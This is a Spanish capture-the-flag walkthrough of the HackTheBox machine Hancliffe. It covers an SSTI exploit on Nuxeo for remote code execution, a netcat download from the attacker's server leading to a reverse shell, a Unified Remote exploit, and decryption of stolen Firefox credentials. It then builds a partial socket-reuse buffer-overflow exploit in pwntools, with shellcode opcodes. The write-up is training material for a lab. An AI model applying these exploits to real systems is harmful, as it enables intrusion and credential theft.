---
title: "Hancliffe - HackTheBox"
layout: single
excerpt: "Esta es una maquina dificil, para la intrusion me aprovecho un 'Server Side Template Injection' para ganar RCE, la escalada de privielegios se compone de un Binario vulnerable a 'Buffer Overflow' pero con una particularidad, poco espacio en la pila, por lo que hay que derivar a un 'Socket Reuse'."
header:
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/69093629/158271218-a1c68404-ef4a-4ac9-b4cd-db0c26406656.jpg"
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/69093629/125662338-fd8b3b19-3a48-4fb0-b07c-86c047265082.png"
categories:
  - HackTheBox
tags:
  - Socket Reuse
  - ESP
  - Unified Remote
  - SSTI
---

<p align="center">
<img src="https://user-images.githubusercontent.com/69093629/137588497-e7175744-003c-4d58-b61c-86b13a057596.jpg">
</p>

Comence con un escaneo de Nmap para detectar puertos abiertos.

```bash
nmap -sS --min-rate 5000 -v -n -Pn -p- 10.10.11.115 -o nmap.txt
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 04:53 EST
Initiating SYN Stealth Scan at 04:53
Scanning 10.10.11.115 [65535 ports]
Discovered open port 80/tcp on 10.10.11.115
Discovered open port 8000/tcp on 10.10.11.115
Discovered open port 9999/tcp on 10.10.11.115
Completed SYN Stealth Scan at 04:53, 26.41s elapsed (65535 total ports)
Nmap scan report for 10.10.11.115
Host is up (0.044s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
8000/tcp open  http-alt
9999/tcp open  abyss

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.50 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 22 (968B)
```

Hice otro para identicar la version de cada servicio.

```bash
nmap -sCV -p80,8000,9999 10.10.11.115 -o services.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 04:54 EST
Nmap scan report for 10.10.11.115
Host is up (0.056s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.21.0
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.21.0
8000/tcp open  http    nginx 1.21.0
|_http-title: HashPass | Open Source Stateless Password Manager
|_http-server-header: nginx/1.21.0
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe: 
|     Welcome Brankas Application.
|     Username: Password:
|   NULL: 
|     Welcome Brankas Application.
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=3/12%Time=622C6DEE%P=x86_64-pc-linux-gnu%r(NU
SF:LL,27,"Welcome\x20Brankas\x20Application\.\nUsername:\x20")%r(GetReques
SF:t,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")
SF:%r(HTTPOptions,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Pa
SF:ssword:\x20")%r(FourOhFourRequest,31,"Welcome\x20Brankas\x20Application
SF:\.\nUsername:\x20Password:\x20")%r(JavaRMI,31,"Welcome\x20Brankas\x20Ap
SF:plication\.\nUsername:\x20Password:\x20")%r(GenericLines,31,"Welcome\x2
SF:0Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(RTSPRequest,3
SF:1,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(
SF:RPCCheck,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password
SF::\x20")%r(DNSVersionBindReqTCP,31,"Welcome\x20Brankas\x20Application\.\
SF:nUsername:\x20Password:\x20")%r(DNSStatusRequestTCP,31,"Welcome\x20Bran
SF:kas\x20Application\.\nUsername:\x20Password:\x20")%r(Help,31,"Welcome\x
SF:20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(TerminalServ
SF:erCookie,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password
SF::\x20")%r(TLSSessionReq,31,"Welcome\x20Brankas\x20Application\.\nUserna
SF:me:\x20Password:\x20")%r(Kerberos,31,"Welcome\x20Brankas\x20Application
SF:\.\nUsername:\x20Password:\x20")%r(SMBProgNeg,31,"Welcome\x20Brankas\x2
SF:0Application\.\nUsername:\x20Password:\x20")%r(X11Probe,31,"Welcome\x20
SF:Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(LPDString,31,"
SF:Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(LDA
SF:PSearchReq,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Passwo
SF:rd:\x20")%r(LDAPBindReq,31,"Welcome\x20Brankas\x20Application\.\nUserna
SF:me:\x20Password:\x20")%r(SIPOptions,31,"Welcome\x20Brankas\x20Applicati
SF:on\.\nUsername:\x20Password:\x20")%r(LANDesk-RC,31,"Welcome\x20Brankas\
SF:x20Application\.\nUsername:\x20Password:\x20")%r(TerminalServer,31,"Wel
SF:come\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(NCP,31
SF:,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(N
SF:otesRPC,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:
SF:\x20")%r(WMSRequest,31,"Welcome\x20Brankas\x20Application\.\nUsername:\
SF:x20Password:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.32 seconds
```

La pagina principal tenia lo siguiente:

![https://imgur.com/QVu20GJ.png](https://imgur.com/QVu20GJ.png)

`nginx`, nada interasante, y por el puerto `8000`:

![https://imgur.com/pUIBwny.png](https://imgur.com/pUIBwny.png)

Parecia ser algun tipo de generador de contraseñas en base a lo que le ponias, hice una prueba.

![https://imgur.com/M4OqzeN.png](https://imgur.com/M4OqzeN.png)

Me genero una contraseña, pero no me servia para nada, lo deje en segundo plano y me conecte al puerto `9999` por `nc`.

![https://imgur.com/BJhrGTy.png](https://imgur.com/BJhrGTy.png)

Era un aplicativo que te pedia credenciales que no tenia, por lo que recurri a hacer *fuzzing* a la pagina principal y encontre el directorio `maintentance` que me llamo la atencion.

![https://imgur.com/jVQHWzg.png](https://imgur.com/jVQHWzg.png)

Accediendo al recurso hacia un *redirect* hacia un `404 Not Found`.

![image](https://user-images.githubusercontent.com/69093629/158074278-d0448566-7271-4265-9b25-c00a64879638.png)

Envie una peticion `GET` a ese recurso para ver las cabeceras de respuesta.

![https://imgur.com/VtBaDIY.png](https://imgur.com/VtBaDIY.png)

El *redirect* lo aplica por la cabecera `Location`, probe a acceder a un recurso que no existe con `..;` porque en el servidor estaba corriendo `java` y podria funcionar.

![image](https://user-images.githubusercontent.com/69093629/158074567-f86e5dd8-90b9-44df-99c7-c451911f719c.png)

Y si, no me aplico el *redirect*, esto me llamo la atencion, asi que probe a hacer *fuzzing* haciendo uso de `..;` y encontre muchos recursos.

![https://imgur.com/fTVOduw.png](https://imgur.com/fTVOduw.png) 

`/login.jsp`, accediendo encontre un panel de *login*.

![https://imgur.com/lFPcD5L.png](https://imgur.com/lFPcD5L.png)

Abajo del todo estaba la version de `nuxeo`, hice una pequeña busqueda en busca de *exploits*.

![https://imgur.com/CMlGYZ1.png](https://imgur.com/CMlGYZ1.png)

Este enviaba una peticion `GET` a una ruta dada aprovechando lo que parecia ser un `SSTI`.

![https://imgur.com/600N9F1.png](https://imgur.com/600N9F1.png)

Inmediatamente probe a verificar si era vulnerable.

![https://imgur.com/00IxCqb.png](https://imgur.com/00IxCqb.png)

Y si era vulnerable, me reporto `14` en el resultado del error.

![https://imgur.com/00IxCqb.png](https://imgur.com/00IxCqb.png)

Ahora solo me faltaba encontrar la manera de ganar `RCE`, en *PayloadAllTheThings* encontre sentencias maliciosas que me permitieron ganar ejecucion de codigo arbitrario.

![image](https://user-images.githubusercontent.com/69093629/158074944-d67823a6-c860-4c2d-8d1b-8941951b10dc.png)

Para verificarlo puse `tcpdump` en escucha de trazas `ICMP`.

![https://imgur.com/2bSFUJ7.png](https://imgur.com/2bSFUJ7.png)

Tras recibir las trazas `ICMP` solo me faltaba ganar acceso a la maquina, abri un servidor de Python alojando `nc64.exe` y me lo descargue desde la maquina victima con `curl`, lo exporte a `C:\programdata\` ya que tenia capacidad de escritura.
 
![https://imgur.com/8AqlCuO.png](https://imgur.com/8AqlCuO.png)

Envie otra peticion entablandome una conexion `TCP` desde el `nc64.exe` de la victima.

![https://imgur.com/IX1RYc1.png](https://imgur.com/IX1RYc1.png)

Y gane acceso como usuario `svc_account`, cambie al directorio raiz y habia lo siguiente.

![https://imgur.com/aizIIGt.png](https://imgur.com/aizIIGt.png)

Nada fuera de lo normal, tampoco tenia capacidad de lectura de la *flag*, viendo los puertos que estaban corriendo internamente en la maquina, encontre los siguientes:

![https://imgur.com/gFhoGq9.png](https://imgur.com/gFhoGq9.png)

Para enumerar los puertos por su nombre y informacion adicional utilice el siguiente comando en Powershell:

![https://imgur.com/OGvrlik.png](https://imgur.com/OGvrlik.png)

Estaba corriendo este binario que me llamo la atencion por el puerto `9511`, lo deje en segundo plano.

![https://imgur.com/6P7N8oQ.png](https://imgur.com/6P7N8oQ.png)

Tras una pequeña vista de todos los puertos que habia, hubo uno que tras una pequeña busqueda en Google lo delato, el puerto `9512`, encontre un *exploit* de `Unified Remote`.

![image](https://user-images.githubusercontent.com/69093629/158075856-e878de64-e70d-4af4-9c02-2ac474c2537a.png)

Le tenia que pasar la IP del servidor vulnerable, el puerto y un binario malicioso, ya que este me haria el `certutil` para la descarga del mismo y me lo ejecutaria.

![https://imgur.com/NzkjYiL.png](https://imgur.com/NzkjYiL.png)

El puerto `9512` estaba abierto internamente por lo que no tenia alcance desde fuera, por ello hice un reenvio de puertos con `Chisel`, abri un servidor en mi maquina.

![https://imgur.com/vi2CJsZ.png](https://imgur.com/vi2CJsZ.png)

Y desde la otra maquina me conecte como cliente al servidor por el puerto `8888`.

![https://imgur.com/7ehkGMC.png](https://imgur.com/7ehkGMC.png)

Y ya tenia el puerto `9512` accesible en mi `localhost`, lo verifique con `netstat -nat`.

![https://imgur.com/pqukMpB.png](https://imgur.com/pqukMpB.png)

Ejecute el *exploit*.

![https://imgur.com/pgR0W4k.png](https://imgur.com/pgR0W4k.png)
 
Y gane acceso a la maquina como el usuario `clara`.

![https://imgur.com/m7hDmSQ.png](https://imgur.com/m7hDmSQ.png)

Y ya tenia acceso a la *flag* del usuario.

![evqvQWe](https://user-images.githubusercontent.com/69093629/158076491-96248ecd-0f7a-40d1-81df-424b4897d963.jpg)

Enumerando bien encontre dos directorios de usuario de Firefox.

![https://imgur.com/3bDNgkV.png](https://imgur.com/3bDNgkV.png)

El primero no tenia nada.

![https://imgur.com/MmCXphV.png](https://imgur.com/MmCXphV.png)

El otro tenia muchos archivos y carpetas por lo que decidi descargarmelos a mi maquina, abri un servidor `smb`.

![https://imgur.com/796GNli.png](https://imgur.com/796GNli.png)

Me copie el directorio `ljftf853.default-release` a mi unidad con `copy -recurse ljftf853.default-release \\10.10.16.53\files`, tenia un archivo llamativo llamado `logins.json`.

![https://imgur.com/j9YqIgA.png](https://imgur.com/j9YqIgA.png)

Tenia una *encryptedPassword* la cual podia descifrar si tenia el archivo `key4.db` o `key3.db`, lo cual tenia el primero, utilice la herramienta `firepwd.py` para ello, esta permitia descifrar contrasñea protegidas por Mozilla.

![https://imgur.com/bsThYSG.png](https://imgur.com/bsThYSG.png)

```python
┌──(root💀kali)-[/home/kali]
└─$ python3 firepwd.py -d ../ljftf853.default-release                                                   
globalSalt: b'9a30912b4d63331f8493789d7b0fce68520f9265'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'cda4b75c5041c6cc7114e053f012122ce92ada163d91df9306158a06d145998a'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'f8cea67900ed4b333ca56416f69a'
       }
     }
   }
   OCTETSTRING b'3f321c52f6534075d3d8915531d27df9'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'8d0ed50896869dc856de82150164a1390a953b67792edac2a62315625836ff08'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'76eba390fe01807925d822a071da'
       }
     }
   }
   OCTETSTRING b'cde74fae29c28c791794371b447180cabce01b6927bac73199f192e557136c36'
 }
clearText b'9efbbfd986fd5bef94b032679b7679d09b1f51891601b6e50808080808080808'
decrypting login/password pairs
http://localhost:8000:b'hancliffe.htb',b'#@H@ncLiff3D3velopm3ntM@st3rK3y*!'
```

Y en cuestion de segundos la descifro, habia otro usuario en el sistema llamado `development`.

![https://imgur.com/Hkp5v0U.png](https://imgur.com/Hkp5v0U.png)

Esto realmente era una pista, si recordamos habia una pagina de generacion de contraseñas, entonces puse estas credenciales y el usuario `development`.

![https://imgur.com/XMXafJq.png](https://imgur.com/XMXafJq.png)

La contraseña generada me podria servir para autenticarme por `winrm` haciendo uso del usuario `development` ya que estaba dentro del grupo *Remote Managment Users*, pero no esta expuesto, por lo que tuve que hacer otro reenvio de puertos del puerto `5985`, me abri un servidor en mi maquina con `Chisel` por el puerto `8888` y me conecte como cliente desde la maquina victima.

![https://imgur.com/6GhBOVH.png](https://imgur.com/6GhBOVH.png)

Ahora si, me autentique con el usuario `development` por `winrm`.

![https://imgur.com/1HO6k3P.png](https://imgur.com/1HO6k3P.png)

<hr>
<h1 align="center"><b>ESCALADA DE PRIVILEGIOS</b></h1>

Para la escalada me acorde del binario que corria por el puerto `9511` en la maquina llamado `MyFirstApp.exe`.

![https://imgur.com/6P7N8oQ.png](https://imgur.com/6P7N8oQ.png)

Me lo transferi a mi maquina y le hice `reversing` con `ghidra`, habia una funcion `_login` con unas credenciales.

![https://imgur.com/21LQBve.png](https://imgur.com/21LQBve.png)

La contraseña parecia estar en base64, la decodifique.

![https://imgur.com/C9M15RW.png](https://imgur.com/C9M15RW.png)

Pero no me sirvio de nada hasta que vi las funciones *_encrypt1* y *_encrypt2*.

![https://imgur.com/rfJvtHv.png](https://imgur.com/rfJvtHv.png)

Esta es *_encrypt1*, estaba remplazando la primera letra por la utlima y asi sucesivamente, se estaba aplicando el algoritmo de codificacion `atbash`. 

La segunda esta ROT47, remplaza un caracter ASCII con el caracter 47 despues de él.

![https://imgur.com/dhCcMBy.png](https://imgur.com/dhCcMBy.png)

Primero hice el proceso inverso de Base64, despues Atbash y finalmente ROT47, quedo esta contraseña.

![https://imgur.com/5JrBaoL.png](https://imgur.com/5JrBaoL.png)
![https://imgur.com/9T4jqCl.png](https://imgur.com/9T4jqCl.png)

Analizando mas el binario encontre esta otra funcion llamada *_SavedCreds*, esta sirve para almacenar las credenciales, el problema es que usa `strcpy` para copiar el *buffer* que esta definido en *50 bytes*, esto provoca un desbordamiento del búfer.

![https://imgur.com/rh4YpkS.png](https://imgur.com/rh4YpkS.png)

Entrando un poco mas en detalle en la funcion *_login*, veo que se esta entablando una conexion, un *socket* con *400 bytes* de longitud despues de introducir algo en un campo llamado *Input Your Code*, este me llamo la atencion, porque si me conecto al puerto `9999` desde `nc` y utilizo las credenciales que tengo...

![https://imgur.com/DX2y69H.png](https://imgur.com/DX2y69H.png)

Exacto, este binario es el que esta corriendo por el puerto `9999` externamente en la maquina y es vulnerable a BoF, por lo que le introduje muchas A y corrompio.

![https://imgur.com/6EilS5h.png](https://imgur.com/6EilS5h.png)

Para aprovecharme de esto lo explote primero en local, inicie `x32dbg` y el binario.

![image](https://user-images.githubusercontent.com/69093629/158053117-41a5e855-0822-4cdf-8c4c-500c2f376866.png)

Primero me cree una cadena especial con `pattern_create` para encontrar los *bytes* antes de sobrescribir *EIP*.

En el *exploit* comence definiendo la libreria `pwn` para poder interactuar con el binario, y `sys` para definir los argumentos que hay que pasarle, tambien defino una clase llamada *Exploit* con un inicializador al que le he pasado tres variables, que serian el usuario, la contraseña y el nombre, y finalmente defino un metodo que es por donde va a empezar el flujo del *exploit*.

```python
#!/usr/bin/python3

from pwn import *
from sys import argv

class Exploit():

	def __init__(self, user, password, name):

		self.__user = user
		self.__password = password
		self.__name = name

	def socket_reuse(self):
  
		r = remote("192.168.1.145", argv[1])

		r.sendlineafter(b"Username: ",self.__user)
		r.sendlineafter(b"Password: ",self.__password)
		r.sendlineafter(b"FullName:",self.__name)	
		r.sendlineafter(b"Input Your Code:",payload)
		sleep(1)
		r.sendline(buf)

autopwn = Exploit(b'alfiansyah', b'K3r4j@@nM4j@pAh!T', 'Vickry Alfiansyah')

def main():
	autopwn.socket_reuse()

if __name__ == '__main__':
	main()
```

Comence comprobando que el *exploit* funcionaba bien.

![https://imgur.com/DjhCekr.png](https://imgur.com/DjhCekr.png)

Lo segundo que hice fue desactivar *DEP* ya que de lo contrario no podria ejecutar insturucciones en la pila, esto se puede hacer desde opciones de rendimiento.

![image](https://user-images.githubusercontent.com/69093629/158053356-f85bd4e2-26b6-4eee-8443-bd67148422a2.png)

Ahora si podia seguir, primeramente con `pattern_create` me cree una cadena especial diciendole con cuentos *bytes* mi programa corrompe, le puse 200, esto es para saber cuantos *bytes* hay que pasarle antes de sobrescribir *EIP*.

![https://imgur.com/59c7Dxy.png](https://imgur.com/59c7Dxy.png)

En el *script* añadi la siguiente linea con la cadena generada por `pattern_create` en la variable `payload`.

```python
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
```

Tras ejecutar el *exploit* esta era la direccion que tenia *EIP*:

![image](https://user-images.githubusercontent.com/69093629/158053163-095e228b-5263-409d-8490-fcdcf1d467f1.png)

La copie y la pegue en `pattern_offset`.

![https://imgur.com/8QkhGlx.png](https://imgur.com/8QkhGlx.png)

Ahi esta, el *offset* son 66 *bytes* antes de sobrescribir *EIP*. Probe a enviar 100 B con la siguiente cadena actualizando la variable `payload`:

```python
payload = 66*"\xBB"
```

Este fue el resultado:

![image](https://user-images.githubusercontent.com/69093629/158054696-f4f21223-8294-49b9-b6bc-46fac2970c10.png)

Como se puede apreciar no estan todas las B que he enviado, esto sucede porque el *buffer* definido esta muy limitado, aqui tenemos un problema, ya que si no tenemos suficiente espacio no podremos inyectar nuestro `shellcode`, aqui hice uso de una tecnica llamada *socket reuse*, se basa en la reutilizacion de sockets para inyectar *shellcode*, ya que suele haber suficiente espacio para aprovechar.
El siguiente paso fue hacer una busqueda de direcciones que contengan `jmp esp` en la direccion de `push esp`.

![image](https://user-images.githubusercontent.com/69093629/158063903-6abcc2e7-94db-40a6-af83-f97e4def4077.png)

![image](https://user-images.githubusercontent.com/69093629/158054302-fedbe5c9-f3cb-455e-b34c-309e0894bfc3.png)

Este fue el resultado en la pestaña *References*.

![image](https://user-images.githubusercontent.com/69093629/158054325-56210e63-9237-4362-90ae-4a70cc74f91d.png)

Hice un *breakpoint* en una direccion parecida a la que estaba en `push ebp`, en este caso `719023A8`, esta me iva a servir como "direccion de retorno", la sume a la variable `payload` en *little endian*.

```python3
payload = 66*"xBB" + p32(0x719023A8)
```

![image](https://user-images.githubusercontent.com/69093629/158064075-9759fa85-47a4-4593-b0aa-896a94c98826.png)

Tras una ejecucion del exploit *ESP* se convirtio en `023FFF18`, despues de darle en `Step Into` la direccion *ESP* se paso a *EIP*.

![image](https://user-images.githubusercontent.com/69093629/158204266-485fd528-bb37-4282-9885-8a2e3d228e08.png)

*EIP* apuntaba al final de mis *bytes* y tenia que hacer que apunte desde el principio para que el flujo del programa vaya para abajo y pase por una direccion con el *buffer* del *socket*. Para ello lo que hice fue abrir `nasm_shell.rb` y restar *70 bytes* ya que el *buffer* son *66 bytes* + *4 bytes* de la direccion.

![image](https://camo.githubusercontent.com/4ea6db709a78753caa9c6bb36d61881023fcfc848f6d4cc86381f56f6216a42c/68747470733a2f2f696d6775722e636f6d2f4c4465456658432e706e67)

Este *opcode* lo añadi a la variable `payload`.

```python
payload = 66*"xBB" + p32(0x719023A8) + b"\xeb\xb8"
```

Ya tenia *EIP* apuntando al principio de mi cadena.

![image](https://user-images.githubusercontent.com/69093629/158063097-834bc72a-85fc-4e2a-b023-6614aebfc548.png)

Lo siguiente fue identificar la funcion `recv` del *socket* y hacer un *breakpoint* cuando hace la llamada.

![image](https://user-images.githubusercontent.com/69093629/158064764-801a1679-4d33-4b05-9e06-2fba17d5e5be.png)

Esto lo hice para ver la estructura de direcciones de la funcion `recv`.

![image](https://user-images.githubusercontent.com/69093629/158064829-e784b600-a774-4c47-b972-d98cc3c546cd.png)
 
La primera direccion es el descriptor que identifica al *socket*, la segunda el *buffer* para recibir los datos, en este caso el *shellcode*, la tercera la longitud, en este caso *400 bytes* como hemos visto con `ghidra` y la ultima son las *flags*, estas direcciones se interpretan de abajo para arriba por eso tuve que adecuarlo a como estan, esto se puede ver mejor de esta manera:

```c++
int recv(
  [in]  SOCKET s,
  [out] char   *buf,
  [in]  int    len,
  [in]  int    flags
);
```

Hice un `push` de *ESP* para apilarla al final del todo de la pila y luego hice un `pop` a `eax` para desapilar *ESP* y que *EAX* tenga la direccion de *ESP*.

- Esto es lo que hace `push` y `pop`

![Stack-sv](https://user-images.githubusercontent.com/69093629/158243788-f79f393a-3d76-4566-8de4-653e425c66eb.png)

Corri el programa y me hizo el *push esp*.

![image](https://user-images.githubusercontent.com/69093629/158067158-c6ee094b-bd55-4d0f-bc0d-a93b62b49845.png)
 
El valor que tenia en *EAX* era el siguiente:

![image](https://user-images.githubusercontent.com/69093629/158067231-6083bdc4-d712-4e10-8719-d9ca33ac8d0a.png)
 
Entonces ahora el valor de *ESP* tenia que estar al final, es decir la ultima direccion de la pila.

![image](https://user-images.githubusercontent.com/69093629/158067243-76ff6958-8e91-4f6d-8fab-d425f14e0a84.png)
 
Y ahora tras hacer un `pop eax`, la direccion de *ESP* que es `023FFF28` estaba en el registro *EAX*.  

![image](https://user-images.githubusercontent.com/69093629/158067246-ead6c5e1-731d-43aa-b5ab-42718edce4b0.png)
 
Todo esto lo hice para poder hacer operaciones aritmeticas y operaciones de entrada y salida con este registro, mi idea era que el descriptor del *socket* que estaba en la posicion 60 este al final de la pila, la ultima direccion, para ello reste 60 a 18, ya que este debe estar adecuado al *socket*.

![image](https://user-images.githubusercontent.com/69093629/158065231-14a2d3e1-59ed-4758-8fee-b64c8ec12404.png)

Tras hacer `0x60 - 0x18` el resultado fue `0x48`, pero el resultado tenia un *null byte*, este no debia estar ya que de lo contrario el *exploit* no funcionaria como debe, para evitar esto hice una suma de `0x230` ya que no tenia *null byte* y le reste `0x48`, el resultado fue `0x1E8`, de esta manera el resultado no tenia un *byte* nulo y se comportaba de la misma forma.

![image](https://camo.githubusercontent.com/725da9cc3eded4dace28def1c8ba625b63fe18697fa91232b5a17aec8c93cdc7/68747470733a2f2f696d6775722e636f6d2f7a3970703457752e706e67)

En el *script* tenia los *opcode* que restaban 70 para posicionar *ESP* (actua como "direccion de retorno") al principio de las A y los *opcode* de `push esp` y `pop eax`, estos en la variable `recv`.
La variable `payload` hacia los calulos, suma `recv` a la cadena restante de A tras restar los 66 *bytes* a la longitud de `recv` y despues suma la direccion de `jmp esp` a los *opcode*.

```python
recv = b""
recv += b"\x54" 				          # -> push esp
recv += b"\x58" 				          # -> pop eax
recv += b"\x66\x05\x30\x02" 			# -> add ax, 0x230
recv += b"\x66\x2d\xe8\x01" 			# -> sub ax, 0x1E8

payload = recv + b"\xAA"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70
```

Ahora bien, el valor del descriptor del *socket* lo tenia que almacenar en un registro para poder llamarlo despues, en este caso *ESI*, lo que hice fue mover el valor de *EAX* que ahora contenia la direccion del descriptor del *socket* a *ESI*.

![image](https://camo.githubusercontent.com/a62946076fea31cbfa323bdda18d8096476cdf506e8a34ae1f4a384e6a2fe480/68747470733a2f2f696d6775722e636f6d2f527142656a67792e706e67)

El *opcode* lo introduje en el *exploit* en la variable `recv`.

```python
recv += b"\x8b\x30" # -> mov esi, [eax]
```
Ejecute el *exploit* y *EAX* tenia la direccion en la que estaba el descriptor del *socket*, `024BFF60`.

![image](https://user-images.githubusercontent.com/69093629/158068089-76ebeb6d-c46d-4810-9f03-8d6652b52ef3.png)
 
Tras hacer un `Step Into` ya tenia almacenado el descriptor en *ESI*, ya tenia el descripor del *socket* hecho, ahora solo me quedaba el *buffer*, la longitud y las *flags* pero tenia un pequeño incoveniente, *EIP* ira para abajo donde se puede encontrar con *ESP*, esto podria generar problemas.

![image](https://user-images.githubusercontent.com/69093629/158069800-9f65129c-07de-4226-abe7-9ca123a0553e.png)
 
Para solucionarlo simplemente reste 70 *bytes* a `ESP`.

![image](https://camo.githubusercontent.com/2a54af66cd0aa62eea60c0cd3322c17940f686f2456736bed2e705fb02e3d096/68747470733a2f2f696d6775722e636f6d2f346d59664771582e706e67)
 
Esto lo hice porque asi posiciono *ESP* por encima de *EIP* y no habrian problemas cuando *EIP* interprete para abajo.

![image](https://user-images.githubusercontent.com/69093629/158068284-575dc5f1-f4b5-4265-8905-a2da779ee1e4.png)
 
Segui con las *flags*, este valor tenia `0x00000000`, podia usar *EBX* para almacenarlo, hice un `xor` a `ebx` ya que da como resultado 0 y tambien le hice un `push` a *EBX* para apilarlo al final.

![image](https://camo.githubusercontent.com/18e173f11ab4a482c711010899765142fc08c9a520c8bcb04f16331f94ff2391/68747470733a2f2f696d6775722e636f6d2f6c5276424c61652e706e67)
![image](https://user-images.githubusercontent.com/69093629/158069004-859a1247-80bd-4350-a519-10eb2e71539d.png)
  
Ahora simplemente podia sumar a *EBX* 410 *bytes* para hacer la longitud ya que vale 0 y volver a hacer un `push` a *EBX* para apilar la longitud al final de la pila.

![image](https://camo.githubusercontent.com/7fa632f856ba659e084e99a805d0cd3c3df2c746dbbd723c5b339a43a0c8347b/68747470733a2f2f696d6775722e636f6d2f324a595a676c732e706e67)

![image](https://user-images.githubusercontent.com/69093629/158069237-bcd5bae8-5aa8-4d10-8782-77974a5c79ea.png)
 
Asi estaba quedando el *exploit*.

```python
recv = b""
recv += b"\x54" 				# -> push esp
recv += b"\x58" 				# -> pop eax
recv += b"\x66\x05\x30\x02" 			# -> add ax, 0x230
recv += b"\x66\x2d\xe8\x01" 			# -> sub ax, 0x1E8
recv += b"\x8b\x30" 				# -> mov esi, dword [eax]
recv += b"\x83\xec\x70" 			# -> sub esp, 0x70
recv += b"\x31\xdb" 				# -> xor ebx, ebx
recv += b"\x53" 				# -> push ebx 
recv += b"\x66\x81\xc3\x10\x04" 		# -> add bx, 0x410
recv += b"\x53" 				# -> push ebx

payload = recv + b"\xAA"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70
```

Ya que habia restado 70 *bytes* en el *ESP*, hice que *EBX* tenga el valor de *ESP* para volver a sumar 70 *bytes* a *EBX* y caer en un punto intermedio donde estan mis A, ahi pondre NOPS para que siga el flujo del programa sin problemas hasta *EBX* que estara apuntando a la funcion de *socket* `recv`, la cual contendra suficiente espacio para almacenar el *shellcode*.

![image](https://camo.githubusercontent.com/6651c05abecefe0cbf059369452cf60482f710663713130d10c1c003d717f44d/68747470733a2f2f696d6775722e636f6d2f4b3975394e50552e706e67)
![image](https://camo.githubusercontent.com/e7dc879292922fb5ebb1d8a4c76ef811f6a5cbaffeb044edc132c73faeefa7cf/68747470733a2f2f696d6775722e636f6d2f374d324835366b2e706e67)
 
*EBX* ya tenia la misma direccion que *ESP*.
 
![image](https://user-images.githubusercontent.com/69093629/158069787-a0f86e9f-4b23-4322-9531-2a4c6e9400ff.png)
 
Hice un `Step Info` y se aplico la suma de los 70 *bytes*, por lo que *EBX* ya estaba en un punto intermedio de las A.

![image](https://user-images.githubusercontent.com/69093629/158069800-9f65129c-07de-4226-abe7-9ca123a0553e.png)
  
El *exploit* estaba quedando asi:

```python
recv = b""
recv += b"\x54" 				# -> push esp
recv += b"\x58" 				# -> pop eax
recv += b"\x66\x05\x30\x02" 			# -> add ax, 0x230
recv += b"\x66\x2d\xe8\x01" 			# -> sub ax, 0x1E8
